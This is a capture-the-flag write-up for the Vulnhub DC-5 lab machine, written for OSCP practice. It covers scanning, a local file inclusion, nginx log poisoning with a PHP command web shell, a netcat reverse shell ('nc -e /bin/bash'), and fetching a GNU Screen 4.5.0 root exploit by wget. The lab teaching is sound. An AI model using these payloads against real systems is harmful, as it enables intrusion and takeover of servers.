---
title: Write-up DC5 on Vulnhub
author: eMVee
date: 2023-03-29 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP, LFI, Log poisoning, screen]
render_with_liquid: false
---

There are 9 DC machines available on Vulnhub and today I love to share the writeup of the fifth machine in this awesomd serie. Since I am preparing for the OSCP exam I like to practice as much as possible. Some machines I do while I am travelling and I am not connected to the internet. That's why I love vulnerable (virtual) machines. The machine can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/dc-5,314/). After downloading the virtual machine, you have to configure the machine so it is on the same network as your Kali machine.

## Getting started

First create a working directory for this Vulnhub machine.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd DC-5
```
Now I would like to know my own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ myip    

    inet 127.0.0.1
    inet 10.0.2.15

```
Since I know my IP address it is time to identify other IP addresses in my virtual network. The first command I use is with fping.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.34
```
Another method to identify IP addresses on my network is with arp-scan. I normally use arp-scan as second method since the results could be different.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ sudo arp-scan --localnet        
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:45:23:77       PCS Systemtechnik GmbH
10.0.2.34       08:00:27:e3:20:d6       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.027 seconds (126.30 hosts/sec). 4 responded
```
There is a new IP address in my virtual network. Now let's create a variable called `ip` which has the IP address of the target assigned.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ ip=10.0.2.34
```

## Enumeration
Now let's start with a basic port scan.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ nmap -sC -p- $ip -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 15:27 CEST
Nmap scan report for 10.0.2.34
Host is up (0.00020s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
|_http-title: Welcome
111/tcp   open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33567/tcp   status
|   100024  1          37062/tcp6  status
|   100024  1          42799/udp   status
|_  100024  1          43311/udp6  status
33567/tcp open  status

Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds

```

There are three ports open
* Port 80
	* HTTP
* Port 111
	* RPC
* Port 33567
	* No idea what is running here yet

Let's enumerate first the webservice with whatweb and followed by nikto.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ whatweb http://$ip
http://10.0.2.34 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.6.2], IP[10.0.2.34], Title[Welcome], nginx[1.6.2]

```
Some information has been discovered, so update our ntoes again:
* nginx 1.6.2
* Title: Welcome

Now start nikto to identify some more information and perhaps even a vulnerability.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ nikto -h http://$ip 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.34
+ Target Hostname:    10.0.2.34
+ Target Port:        80
+ Start Time:         2023-03-27 15:29:17 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.6.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7915 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2023-03-27 15:29:38 (GMT2) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nothing new found. Let's see what files and directories can be found using dirb and dirsearch.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ dirb http://$ip                         

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Mar 27 15:32:39 2023
URL_BASE: http://10.0.2.34/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.2.34/ ----
==> DIRECTORY: http://10.0.2.34/css/                                                                                                                                                                                                      
==> DIRECTORY: http://10.0.2.34/images/                                                                                                                                                                                                   
+ http://10.0.2.34/index.php (CODE:200|SIZE:4025) 

---- Entering directory: http://10.0.2.34/css/ ----
---- Entering directory: http://10.0.2.34/images/ ----

-----------------
END_TIME: Mon Mar 27 15:32:42 2023
DOWNLOADED: 13836 - FOUND: 1

```
Some basic directories of a website are found. Now let's enumerate some files. Perhaps something interesting could be found.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ dirsearch -u http://$ip -e php,txt,html 

  _|. _ _  _  _  _ _|_    v0.4.2                                                         (_||| _) (/_(_|| (_| )  
 
Extensions: php, txt, html | HTTP method: GET | Threads: 30 | Wordlist size: 9901

Output File: /home/emvee/.dirsearch/reports/10.0.2.34/_23-03-27_15-33-00.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-03-27_15-33-00.log

Target: http://10.0.2.34/

[15:33:00] Starting: 
[15:33:15] 200 -    4KB - /contact.php                                      
[15:33:15] 301 -  184B  - /css  ->  http://10.0.2.34/css/                   
[15:33:18] 200 -    6KB - /faq.php                                          
[15:33:18] 200 -   17B  - /footer.php                                       
[15:33:20] 301 -  184B  - /images  ->  http://10.0.2.34/images/             
[15:33:20] 403 -  570B  - /images/
[15:33:20] 200 -    4KB - /index.php                                        
[15:33:36] 200 -  852B  - /thankyou.php  

Task Completed 
```
Some interesting files are shown such as footer.php and contact.php.
Now open a webbrowser and navigate to the website.

![Image](/assets/img/WriteUp/Vulnhub/DC5/Pasted image 20230327153607.png){: width="700" height="400" }

Let's browse the websit eto see if we can find something useful.

![Image](/assets/img/WriteUp/Vulnhub/DC5/Pasted image 20230327154247.png){: width="700" height="400" }

```
http://10.0.2.34/thankyou.php?firstname=&lastname=&country=australia&subject=
```
What if we change the argument to `file=../../../../etc/passwd` to see if we can include another file.
```
http://10.0.2.34/thankyou.php?file=../../../../etc/passwd
```

![Image](/assets/img/WriteUp/Vulnhub/DC5/Pasted image 20230327153931.png){: width="700" height="400" }

It looks like we have identified a local file inclusion vulnerability ( #LFI #Local-File-Inclusion)

Press `CTRL` + `U` to view the source code. This will help us copy the content  of `/etc/passwd` much easier.
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
dc:x:1000:1000:dc,,,:/home/dc:/bin/bash
mysql:x:108:113:MySQL Server,,,:/nonexistent:/bin/false
```

If the webapplication has a LFI vulnerability, it might be logging some details in the nginx log file. If this is the case, we might have the opportunity to inject PHP code. It are a lot of `if's`, but if this is working we might have luck and gain a reverse shell. This vulnerability is called  Log Poisoning as well. #Log-Poisoning

Now let's use our Google Fu to find where the logging is stored for nginx
```
https://www.google.com/search?q=nginx+access+log+location+linux
```

	By default, the access log is located at **/var/log/nginx/access.** **log** , and the information is written to the log in the predefined combined format.

So let's try to open the access.log file in the webbrowser.
```
http://10.0.2.34/thankyou.php?file=/var/log/nginx/access.log
```
![Image](/assets/img/WriteUp/Vulnhub/DC5/Pasted image 20230327163219.png){: width="700" height="400" }


It alerts me with the IP address of the host. Perhaps some old logging is stored with an XSS vulnerability.

Now let's try to poison the logging.
```
<?php system($_GET['cmd']) ?>
```

![Image](/assets/img/WriteUp/Vulnhub/DC5/Pasted image 20230327165740.png){: width="700" height="400" }


This will probably inject the PHP code into the error.log file.

![Image](/assets/img/WriteUp/Vulnhub/DC5/Pasted image 20230327164803.png){: width="700" height="400" }

Now let's try the cmd to exploit withing the error.log file.
```
http://10.0.2.34/thankyou.php?file=../../../../../..//var/log/nginx/error.log&cmd=id
```

![Image](/assets/img/WriteUp/Vulnhub/DC5/Pasted image 20230327165544.png){: width="700" height="400" }

Now we have to start a netcat listener first.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ sudo nc -lvp 53           
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53

```
As soon as the netcat listener is listening to any incomminc connection we have to trigger the reverse shell.
```
10.0.2.34/thankyou.php?file=../../../../../../var/log/nginx/error.log&cmd=nc -e /bin/bash 10.0.2.15 53
```

![Image](/assets/img/WriteUp/Vulnhub/DC5/Pasted image 20230327165954.png){: width="700" height="400" }

Forward the request within Burp Suite and watch the netcat listener.
## Initial access
After forwarding the request we should return to our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ sudo nc -lvp 53           
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.0.2.34.
Ncat: Connection from 10.0.2.34:45823.

```
A connection has been established from our target. Now found out who we are.
```bash
whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
dc-5

```
Okay, first things first... upgrade the shell a bit.
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@dc-5:~/html$ 
www-data@dc-5:~/html$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
<r/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp                   
www-data@dc-5:~/html$ export TERM=xterm-256color  
export TERM=xterm-256color  
www-data@dc-5:~/html$ alias ll='ls -lsaht --color=auto'  
alias ll='ls -lsaht --color=auto'  
```
Now we should background the process for a while with `CTRL + Z`.
```bash
www-data@dc-5:~/html$ ^Z
zsh: suspended  sudo nc -lvp 53
```
Now we should continue with the upgrading of the shell again.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ stty raw -echo ; fg ; reset  
[1]  + continued  sudo nc -lvp 53


www-data@dc-5:~/html$ stty columns 200 rows 200
stty columns 200 rows 200
www-data@dc-5:~/html$ 

```

Now let's check the Linux distro and kernel first.
```bash
www-data@dc-5:~/html$ uname -a
uname -a
Linux dc-5 3.16.0-4-amd64 #1 SMP Debian 3.16.51-2 (2017-12-03) x86_64 GNU/Linux
www-data@dc-5:~/html$ uname -mrs
uname -mrs
Linux 3.16.0-4-amd64 x86_64
www-data@dc-5:~/html$ cat /proc/version
cat /proc/version
Linux version 3.16.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 4.8.4 (Debian 4.8.4-1) ) #1 SMP Debian 3.16.51-2 (2017-12-03)
www-data@dc-5:~/html$ cat /etc/issue
cat /etc/issue
Debian GNU/Linux 8 \n \l

www-data@dc-5:~/html$ cat /etc/*-release
cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
NAME="Debian GNU/Linux"
VERSION_ID="8"
VERSION="8 (jessie)"
ID=debian
HOME_URL="http://www.debian.org/"
SUPPORT_URL="http://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
www-data@dc-5:~/html$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.10 (jessie)
Release:        8.10
Codename:       jessie

```
We now have identified the Linux version and Kernel version. Let's enumerate the users on the system as well.
```bash
www-data@dc-5:~/html$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
dc
www-data@dc-5:~/html$ 

```
Okay, there is one user on the system, let's enumerate the home directory of the `dc` user.
```bash
www-data@dc-5:~/html$ ls /home -ahlR
ls /home -ahlR
/home:
total 12K
drwxr-xr-x  3 root root 4.0K Apr 19  2019 .
drwxr-xr-x 23 root root 4.0K Apr 19  2019 ..
drwxr-xr-x  2 dc   dc   4.0K Apr 20  2019 dc

/home/dc:
total 24K
drwxr-xr-x 2 dc   dc   4.0K Apr 20  2019 .
drwxr-xr-x 3 root root 4.0K Apr 19  2019 ..
-rw------- 1 dc   dc     10 Apr 20  2019 .bash_history
-rw-r--r-- 1 dc   dc    220 Apr 19  2019 .bash_logout
-rw-r--r-- 1 dc   dc   3.5K Apr 19  2019 .bashrc
-rw-r--r-- 1 dc   dc    67
```
There is nothing in the home directory of the user.

```bash
www-data@dc-5:~/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/bin/screen-4.5.0
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/sbin/mount.nfs
www-data@dc-5:~/html$ 

```
In the results there is something called screen-4.5.0 which point out to me directly. Let's find out if this version is vulnerable.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ searchsploit screen 4.5.0
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                                                                             | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                                                                                       | linux/local/41152.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

It looks like there is a known privilege escalation vulnerability available.
Now copy the exploit to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ searchsploit -m 41154    
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
    Codes: N/A
 Verified: True
File Type: Bourne-Again shell script, ASCII text executable
Copied to: /home/emvee/Documents/Vulnhub/DC-5/41154.sh
```
And then host the exploit on our local python webserver.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-5]
└─$ sudo python3 -m http.server 80
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Change the working directory to `/tmp` on the victim and download the exploit.

```bash
www-data@dc-5:/tmp$ wget http://10.0.2.15/41154.sh
wget http://10.0.2.15/41154.sh
converted 'http://10.0.2.15/41154.sh' (ANSI_X3.4-1968) -> 'http://10.0.2.15/41154.sh' (UTF-8)
--2023-03-28 02:30:13--  http://10.0.2.15/41154.sh
Connecting to 10.0.2.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1149 (1.1K) [text/x-sh]
Saving to: '41154.sh'

41154.sh                                          100%[===============================================================================================================>]   1.12K  --.-KB/s   in 0s     

2023-03-28 02:30:13 (332 MB/s) - '41154.sh' saved [1149/1149]

www-data@dc-5:/tmp$ chmod +x 41154.sh
chmod +x 41154.sh

```

## Privilege escalation
Now run the exploit.
```bash
www-data@dc-5:/tmp$ ./41154.sh
./41154.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# 
```
It looks like it worked, let's check this with the command `whoami;id;hostname`.
```bash
# whoami;id;hostname
whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root),33(www-data)
dc-5
```
We are root on DC-5. Not change the working directory to the `/root` directory.
And find out how the flag is called on this machine.
```
# cd /root
cd /root
# ls
ls
thisistheflag.txt
```
Now we only have to capture the full proof with the OSCP method.
```
# whoami;id;hostname;ifconfig;cat thisistheflag.txt
whoami;id;hostname;ifconfig;cat thisistheflag.txt
root
uid=0(root) gid=0(root) groups=0(root),33(www-data)
dc-5
eth0      Link encap:Ethernet  HWaddr 08:00:27:e3:20:d6  
          inet addr:10.0.2.34  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fee3:20d6/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:113993 errors:0 dropped:0 overruns:0 frame:0
          TX packets:111432 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:17491790 (16.6 MiB)  TX bytes:38282345 (36.5 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)



888b    888 d8b                                                      888      888 888 888 
8888b   888 Y8P                                                      888      888 888 888 
88888b  888                                                          888      888 888 888 
888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 
888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 
888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 
888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  
888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 
                                                                                          
                                                                                          


Once again, a big thanks to all those who do these little challenges,
and especially all those who give me feedback - again, it's all greatly
appreciated.  :-)

I also want to send a big thanks to all those who find the vulnerabilities
and create the exploits that make these challenges possible.

# 

```
